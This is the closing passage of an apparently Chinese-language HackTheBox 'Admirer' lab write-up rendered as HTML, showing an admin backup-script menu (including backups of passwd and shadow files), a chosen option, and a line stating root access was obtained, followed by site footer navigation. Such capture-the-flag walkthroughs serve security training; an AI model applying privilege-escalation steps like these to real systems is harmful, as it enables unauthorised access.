+<span class="m">2</span><span class="o">)</span> View logged in users
+<span class="m">3</span><span class="o">)</span> View crontab
+<span class="m">4</span><span class="o">)</span> Backup passwd file
+<span class="m">5</span><span class="o">)</span> Backup shadow file
+<span class="m">6</span><span class="o">)</span> Backup web data
+<span class="m">7</span><span class="o">)</span> Backup DB
+<span class="m">8</span><span class="o">)</span> Quit
+Choose an option: <span class="m">6</span>
+Running backup script in the background, it might take a <span class="k">while</span>...
+</code></pre></div>
+- 成功获取root权限</p>
+<p><img alt="image-20200909120740019" src="../images/HTB-Admirer/image-20200909120740019.png" /></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../HTB-Blunder/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                HackTheBox Blunder靶机
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../HTB-Luanne/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                HackTheBox Luanne靶机
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.6a3d08fc.min.js"></script>
+      <script src="../../assets/javascripts/bundle.71201edf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ['navigation.instant', 'navigation.tabs', 'navigation.tabs.sticky'],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.4ac00218.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="../../js/extra.js"></script>
+      
+        <script src="../../js/baidu-tongji.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
